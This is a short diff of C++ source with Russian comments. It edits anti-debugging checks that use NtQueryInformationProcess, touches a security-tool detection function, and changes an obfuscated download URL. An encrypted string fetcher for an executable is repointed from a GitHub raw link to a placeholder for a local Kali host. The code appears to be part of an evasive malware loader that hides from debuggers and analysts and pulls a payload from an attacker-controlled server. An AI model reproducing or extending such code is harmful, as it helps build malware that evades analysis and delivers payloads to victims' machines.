@@ -44,7 +44,7 @@ bool detectDebuggerByDebugObject() {
     NTSTATUS status = NtQueryInformationProcess(NtCurrentProcess(), 0x1E, &hDebObj, sizeof(hDebObj), NULL); 
 
     if (status == 0x00000000 && hDebObj) {
-        std::cout << "Debugger detected by DebugObject!" << std::endl;
+        std::cout << "флаг детект " << std::endl; // будет доработано
         return true;
     }
     return false;
@@ -56,7 +56,7 @@ bool detectDebuggerByProcessDebugFlags() {
     NTSTATUS status = NtQueryInformationProcess(NtCurrentProcess(), 0x1F, &NoDebugInherit, sizeof(NoDebugInherit), NULL);  
 
     if (status == 0x00000000 && NoDebugInherit == 0) {
-        std::cout << "Debugger detected by ProcessDebugFlags!" << std::endl;
+        std::cout << "флаг детект  " << std::endl; // будет доработано
         return true;
     }
     return false;
@@ -129,7 +129,7 @@ bool detectSecurityTools() {
 
 // Зашифрованный URL для скачивания
 std::wstring getDownloadURL() {
-    auto url = skCrypt(L"https://raw.githubusercontent.com/wh0ami-hash/test-with-crypt/main/Autoruns.exe");
+    auto url = skCrypt(L"адрес локалки  kali.http");
     return url.decrypt(); // Возвращаем расшифрованную строку
 }
 
